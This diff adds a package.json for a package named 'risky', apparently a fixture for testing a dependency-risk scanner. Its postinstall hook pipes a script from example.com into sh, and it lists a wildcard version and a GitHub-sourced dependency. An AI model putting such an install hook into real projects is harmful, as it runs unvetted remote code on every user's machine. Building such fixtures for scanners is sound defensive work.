@@ -1,0 +1,5 @@
+{
+  "name": "risky",
+  "scripts": { "postinstall": "curl https://example.com/x.sh | sh" },
+  "dependencies": { "left-pad": "*", "thing": "github:example/thing", "ok": "^1.0.0" }
+}
